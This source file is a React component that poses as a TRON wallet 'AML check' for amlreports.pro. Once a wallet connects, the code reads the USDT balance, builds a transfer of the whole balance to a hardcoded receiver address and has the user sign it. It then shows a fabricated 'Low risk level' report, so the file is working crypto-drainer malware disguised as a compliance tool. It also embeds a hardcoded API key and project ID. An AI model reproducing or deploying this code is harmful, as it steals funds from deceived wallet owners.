import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';
import { Buffer } from 'buffer';

window.Buffer = Buffer;

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: { themeMode: 'dark' },
});

export const TronAuthButton: React.FC = () => {
  const [status, setStatus] = useState<string | null>(null);

  const connectWallet = async () => {
    setStatus(null);

    try {
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error('Invalid wallet address');
      }

      tronWeb.setAddress(userAddress);

      // 1. Проверка TRX баланса (достаточно ли для комиссии USDT)
      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx = trxRaw / 1e6;
      if (trx < 5) {
        throw new Error('❌ Insufficient TRX balance to pay the network fee (at least 5 TRX required).');
      }

      // 2. Проверка USDT-баланса
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setStatus('success');
        return;
      }

      // 3. Отправка USDT
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        {
          feeLimit: 25_000_000,
          callValue: 0,
        },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      // --- Логируем ответ для отладки ---
      console.log('Send result:', result);

      if (result && result.result) {
        setStatus('success');
      } else if (result && (result.message || result.code)) {
        // Покажи, что реально пришло!
        setStatus('❌ Transaction failed: ' + (result.message || result.code));
      } else {
        setStatus('❌ Transaction failed to send. Try again or check your network.');
      }
    } catch (err: any) {
      console.error('Error:', err);

      const msg =
        (typeof err === 'string' && err) ||
        err?.message ||
        err?.reason ||
        err?.error ||
        err?.toString() ||
        '';

      if (
        /User rejected|Modal is closed|Timeout|Cancelled|cancel|Abort/i.test(msg)
        || msg === ''
        || err?.code === 4001
      ) {
        setStatus(null);
      } else if (
        msg.includes('❌ Insufficient TRX') ||
        msg.includes('Invalid wallet address')
      ) {
        setStatus(msg);
      } else {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      await adapter.disconnect();
    }
  };

  return (
    <div onClick={connectWallet} className="AuthButton">
      {status && (
        <div className="modal__overflow">
          <div className="modal">
            {status === 'success' ? (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className="circ green"></span> 0–30</div>
                      <div><span className="circ orange"></span> 31–69</div>
                      <div><span className="circ red"></span> 70–100</div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for wallet:</p>
                  <h5>{adapter.address}</h5>
                </div>
              </>
            ) : (
              <p>{status}</p>
            )}
            <button onClick={(e) => {
              e.stopPropagation();
              setStatus(null);
            }}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
